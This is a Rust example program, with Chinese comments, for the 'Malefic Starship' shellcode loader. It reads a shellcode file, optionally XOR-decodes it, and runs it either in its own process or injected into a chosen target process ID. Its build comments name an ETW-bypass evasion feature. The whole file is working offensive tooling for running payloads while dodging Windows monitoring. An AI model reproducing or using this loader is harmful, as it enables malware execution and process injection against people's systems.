// Malefic Malefic Starship Launch 使用示例
//
// 编译（选择一个 loader feature）：
//   cargo build --features "func_ptr"
//
// 运行：
//   starship_example.exe <shellcode.bin> [target_pid]
//
// 也可使用编码 + evasion feature：
//   cargo build --features "func_ptr,enc_xor,evader_etw_pass"

use malefic_starship::Shellcode;
use malefic_starship::launch;

use std::env;
use std::process;

fn main() {
    println!("=== Malefic Starship Launch Example ===\n");

    let args: Vec<String> = env::args().collect();

    // ── Stage 1: Load shellcode ──────────────────────────────────────────────
    let sc_path = if args.len() > 1 {
        &args[1]
    } else {
        eprintln!("Usage: {} <shellcode.bin> [target_pid]", args[0]);
        process::exit(1);
    };

    println!("[*] Loading shellcode from: {}", sc_path);
    let raw = launch::load_shellcode(sc_path).unwrap_or_else(|e| {
        eprintln!("[-] {}", e);
        process::exit(1);
    });
    println!("[+] Loaded {} bytes\n", raw.len());

    // ── Stage 2: Decode (if encoding feature enabled) ────────────────────────
    let shellcode = if launch::has_encoding() {
        println!("[*] Encoding feature detected, decoding payload...");
        // Replace with your actual key/extra if using encoded payloads
        let key: &[u8] = &[];
        let extra: &[u8] = &[];
        let decoded = launch::decode_payload(raw.as_slice(), key, extra);
        println!("[+] Decoded {} bytes\n", decoded.len());
        Shellcode::new(decoded)
    } else {
        println!("[*] No encoding — using raw shellcode\n");
        raw
    };

    // ── Stage 3: Parse optional target PID ───────────────────────────────────
    let target_pid: Option<u32> = args.get(2).and_then(|s| s.parse().ok());
    if let Some(pid) = target_pid {
        println!("[*] Target PID: {}", pid);
    } else {
        println!("[*] Self-injection mode (no target PID)");
    }

    // ── Stage 4: Execute ─────────────────────────────────────────────────────
    println!("[*] Executing loader...\n");
    let result = unsafe { launch::execute_loader(&shellcode, target_pid) };

    match result {
        Ok(()) => println!("\n[+] Loader executed successfully"),
        Err(e) => {
            eprintln!("\n[-] Loader error: {}", e);
            process::exit(1);
        }
    }

    println!("[+] Done!");
}
